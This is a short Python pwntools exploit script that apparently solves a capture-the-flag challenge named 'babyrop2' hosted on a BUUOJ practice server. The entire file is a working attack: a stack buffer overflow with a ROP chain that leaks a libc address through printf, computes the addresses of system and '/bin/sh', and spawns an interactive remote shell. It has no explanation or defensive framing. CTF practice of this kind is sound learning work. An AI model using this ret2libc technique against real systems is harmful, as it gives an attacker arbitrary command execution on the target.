from pwn import *
context.log_level = 'debug'
libc = ELF('./libc.so.6')

elf = ELF('./babyrop2')
printf_plt = elf.plt['printf']
printf_got = elf.got['read']
pop_rdi_ret = 0x00400733
main = 0x00400636

conn = remote('node4.buuoj.cn', 29915)


conn.recvuntil(b"What's your name? ")
payload = b'a'*(0x20+0x8) + p64(pop_rdi_ret) + p64(printf_got) + p64(printf_plt) + p64(main) 
conn.sendline(payload)
conn.recvline()
res = conn.recv()
leak_addr = u64(res[:6] + b'\x00\x00')
print(f'leak_addr : {hex(leak_addr)}')
libc_base = leak_addr - libc.sym['read']
system = libc_base + libc.sym['system']
binsh = libc_base  + next(libc.search(b'/bin/sh'))
payload = b'a'*(0x20+0x8) + p64(pop_rdi_ret) + p64(binsh) + p64(system) 
conn.sendline(payload)
conn.recv()
conn.interactive()


